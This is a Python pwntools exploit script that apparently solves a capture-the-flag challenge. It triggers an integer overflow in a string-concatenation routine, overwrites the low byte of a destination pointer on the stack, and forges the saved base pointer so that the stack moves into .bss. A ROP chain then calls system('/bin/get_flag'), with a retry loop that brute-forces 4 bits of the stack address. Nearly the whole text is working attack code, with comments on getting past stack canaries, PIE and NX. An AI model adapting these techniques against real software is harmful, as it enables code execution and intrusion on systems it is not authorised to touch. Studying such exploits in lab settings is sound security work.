#!/usr/bin/python3

#import libraries
import sys
import pwn
from itertools import count
#get some pwn stuff into global namespace
from pwn import p64, sleep
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
pwn.context.log_level = 'error'

#assign host and port to connect to
host = "hacky2"
port = 13714
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])


#not implemented (yet)
#spawn_interactive_shell = False


#These are useful offsets within the vuln binary.
#Not to be confused with the actual addresses, since PIE is enabled.
vuln_offset_factory     = 0x0133f
vuln_offset_abuf        = 0x040c0
vuln_offset_bbuf        = 0x140c0
vuln_offset_pop_rdi_ret = 0x015fb
vuln_offset_plt_system  = 0x01080


#This is where the exploit lives
def exploit():

    #For this task NX, ASLR, Stack Canaries, PIE and partial RELRO are enabled
    #(not full RELRO, so in theory the got remains writable)

    #In this exploit we will bruteforce 4 bit, which will on average succeed in 8 attempts
    for runcnt in count():
        print(f"Run #{runcnt:#0{0}3d}:")
        proc=pwn.remote(host,port,fam="ipv4")
        
        #Conveniently vuln leaks the management briefing to us, which contains the address of the 
        #  factory in memory. This allows us to deduce all addresses within the vuln binary 
        #  despite PIE being enabled.
        #Hence the very first thing we do is retrieve Server's message and retrieve the factory's 
        #  address for future calculations.
        management_briefing = proc.readline()
        vuln_addr_factory = int(management_briefing[-13:-1].decode(), 16)
        vuln_addr_base = vuln_addr_factory - vuln_offset_factory

        #Next we calculate the addresses of ROP gadgets that will be useful later on.
        #Conveniently not only a 'pop rdi ; ret' gadget is available in the vuln binary, but also 
        #  a reference to the libs function system in vuln's plt and got, making it unnecessary to 
        #  leak a libc address to construct a usefull ROP chain.
        vuln_addr_pop_rdi_ret = vuln_addr_base + vuln_offset_pop_rdi_ret
        vuln_addr_system      = vuln_addr_base + vuln_offset_plt_system
        #Additionaly we can also leak the addresses of the two input buffers a and b, which are 
        #  declared as global arrays of constant size and hence live in the .bss section.
        vuln_addr_abuf        = vuln_addr_base + vuln_offset_abuf
        vuln_addr_bbuf        = vuln_addr_base + vuln_offset_bbuf

        #Since we will attempt to construct a ROP chain, we also need to place the path to our 
        #  get_flag binary in memory. Note that we place this at the beginning of buffer a but 
        #  prefix it with a NULL byte so that highly_secure_strcat will not actually work with 
        #  any of the content we place in a. Hence the address pointing to the string is the 
        #  address of a offset by one byte.
        get_flag_str_16 = b"\x00/bin/get_flag\x00\x00" 
        addr_get_flag_str = vuln_addr_abuf + 1

        #The ROP chain we use in this exploit is as simple as it gets.
        #Just place /bin/get_flag in rdi and call system via its plt entry.
        ropchain  = p64(vuln_addr_pop_rdi_ret)
        ropchain += p64(addr_get_flag_str)
        ropchain += p64(vuln_addr_system)

        #Now that all the setup is complete we will deal with the actual vulnerability:
        #
        #The program first promts us to enter the length of the two strings we aim to concatenate.
        #Both (potentially signed) inputs are then converted to integers using atoi() and stored 
        #  in an unsigned short (two byte) variable each: na and nb. These values are then passed 
        #  to fgets as an upper limit of how many characters are allowed to be read. Both buffers 
        #  (a and b) provide enough space for the maximum value we could enter using a 16-bit 
        #  integer.
        #When it comes to invoking the highly_secure_strcat function, it is however  not ensured 
        #  that adding the two values together will not cause an overflow. Additionally memory 
        #  allocation for the input buffer used by highly_secure_strcat solely relies on the value 
        #  result of len=(na+nb-1), whereas the actual concatenation terminates once a NULL byte 
        #  is encountered in the string. Hence the memory allocated may or may not be equal to the 
        #  memory actually used.
        #Specifically we can enter two very large numbers to get a result that is only ever so 
        #  slightly larger then zero. This allows us to read very large inputs to a and b but only 
        #  alocate a very small buffer within the stackframe of highly_secure_strcat.
        #Another thing we can do is to manually terminate a string for the purposes of 
        #  concatenation but continue placing data in a and b, by simply entering a NULL byte, as 
        #  fgets will only terminate on "\n" or EOF, but not on NULL.

        #First we enter a large negative number (which can also be represented as a very large 
        #  positive number if interpreted unsigned, but since atoi takes both it's easier to read 
        #  this way.
        print("(-) Waiting for length prompt one.")
        proc.readuntil(b"first length: \x1b[33m")
        proc.write(b"-8190\n")

        #Then we enter a slightly larger positive number, so that: (na+nb) mod (2^16) == 2
        print("(-) Waiting for length prompt two.")
        proc.readuntil(b"second length: \x1b[33m")
        proc.write(b"8192\n")

        #We now immediately terminate the input to be placed in the first buffer with a NULL byte 
        #  so that it is not considered for concatenation at all. Now we can place data that will 
        #  be used later on in our exploit in the buffer, without having to consider its length 
        #  for our overflow on the stack.
        #Notably we place the /bin/get_flag string at the very beginning of the buffer and the 
        #  ROP chain at a far distance (we chose offset 0x8010). This already indicates what we 
        #  are going to do. Instead writing the buffer to the return address, we will aim to move 
        #  the stack to the .bss section to trigger our ROP chain.
        #The reason we placed it further back in the buffer is, that we need to give the stack 
        #  space to grow toward's the buffer's beginning when invoking functions such as system.
        print("(-) Waiting for string prompt one.")
        proc.readuntil(b"first string: \x1b[33m")
        proc.write(get_flag_str_16 + 0x8000*b"\x00" + ropchain + b"\n")

        #Now comes the interesting part. We already established, that Stack canaries are enabled 
        #  for this task. Hence we cannot simply overflow into the return address to place our ROP 
        #  chain there.
        #Instead we leverage the fact, that the dest pointer telling the highly_secure_strcat 
        #  function where to copy data is located on the stack and accessed each time for 
        #  incrementation. Additionally the buffer overflows in the direction of the dest pointer,
        #  so at some point we will reach it and influence the destination of the data being 
        #  written. Same holds true for the src pointers, but those are behind the dest pointer, 
        #  so we'll reach that one first. Finally none of those variables are protected by the 
        #  stack canary. Only the "management" values such as the base pointer and the return 
        #  address are.
        #So if we trigger our buffer overflow, we simply need to write more or less arbitrary data 
        #  until we reach the dest pointer on the stack. This is easy, since despite not knowing 
        #  its exact address, we know its offset relative to the beginning of the buffer as well 
        #  as the buffer's size.
        #Once we reach it we are able to shift the pointer by up to 15 addresses on the stack by
        #  overriding its lowest byte. We do of course know that the value of the lowest 4 bit, as 
        #  the base pointer will always end in a 0 on an alligned stack, but we have to rely on 
        #  chance when it comes to the 4 bit after this. However, a 1 in 16 chance is quite 
        #  feasible for this type of bruteforce attack.
        #Since this method of writing skips several addresses and only writes a single one, we can 
        #  rest assured that the stack canary remains intact once we manage to hit our target.
        #One might think, that the return address would be an interesting target for our exploit. 
        #The issue with targeting the return address in this scenario is, that we cannot simply 
        #  write a rop chain consisting of multiple addresses, since concatenation will terminate 
        #  on a null byte and every address will contain NULL bytes in position 7 and 8, since its 
        #  only 6 byte long.
        #Instead we will target the base pointer and override it with the address of our rop chain 
        #  in buffer a. The leave instruction before the return will then pop tis addres to the 
        #  rbp register. Due to the multiple consecutive 'leave; ret' instructions executed by 
        #  nested functions in the vuln program, it will eventually further propagate to the rsp 
        #  register finally moving our stack to the desired location. On the last return we then
        #  trigger our ROP chain and invoke system("/bin/get_flag\x00").
        #Note that one of the reasons we chose buffer b for the actual overflow is, that in the 
        #  process of overriding the stack we destroy some other stuff before reaching dest. The 
        #  later we do this in the program the less we need to care about (unintended) sideeffects 
        #  caused by those overrides.
        print("(-) Waiting for string prompt two.")
        proc.readuntil(b"second string: \x1b[33m")
        dest_override_str = 6*(8*b"A") + b"\x40"
        base_pointer_override_str = p64(vuln_addr_abuf + 0x8000 + 8)
        proc.write(dest_override_str + base_pointer_override_str + b"\n")

        #Get the 'Result: ...' prompt out of the way.
        result_msg = proc.readline()

        #Now all that's left to do is retrieve the flag and hope for the best. Of course with this 
        #  approach we expect an average of 8 attempts to be needed. Hence we'll simply retry the 
        #  whole thing if no flag is present in the response or an EOFError is encountered.
        try:
            while True:
                flag = proc.readline()
                if b"flag" in flag:
                    break;
            print(f"(-) Successfully retrieved flag: \033[32m{flag.decode()}\033[0m")
            proc.close()
            return
        except EOFError:
            print("(-) Stack bruteforce failed. Retrying...")
            proc.close()
            continue


#Trigger the exploit once the script is executed
exploit()


